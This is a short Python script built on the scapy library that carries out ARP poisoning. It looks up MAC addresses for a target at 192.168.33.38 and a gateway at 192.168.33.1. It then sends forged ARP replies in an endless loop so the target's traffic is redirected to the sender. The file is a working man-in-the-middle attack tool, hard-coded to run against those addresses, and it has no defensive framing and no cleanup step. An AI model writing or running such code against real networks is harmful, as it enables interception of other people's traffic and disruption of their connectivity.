from scapy.all import Ether, ARP, sendp, srp
import time
import sys


def getMac(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
    return None


def poisoningDone(target_ip, target_mac, host_ip, host_mac):
    pkt_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=host_ip)
    pkt_host = Ether(dst=host_mac) / ARP(op=2, pdst=host_ip, psrc=target_ip)
    while True:
        sendp(pkt_target, verbose=False)
        # sendp(pkt_host, verbose=False)
        time.sleep(1)


def arpPoisoning(target_ip, host_ip):
    target_mac = getMac(target_ip)
    host_mac = getMac(host_ip)

    if target_mac is None:
        print(f"Failed to get MAC address for target IP {target_ip}")
        sys.exit(1)
    if host_mac is None:
        print(f"Failed to get MAC address for host IP {host_ip}")
        sys.exit(1)

    print(f"Start ARP Poisoning: {target_ip} {target_mac} <--> {host_ip} {host_mac}")

    try:
        poisoningDone(target_ip, target_mac, host_ip, host_mac)
    except KeyboardInterrupt:
        sys.exit(0)


arpPoisoning("192.168.33.38", "192.168.33.1")
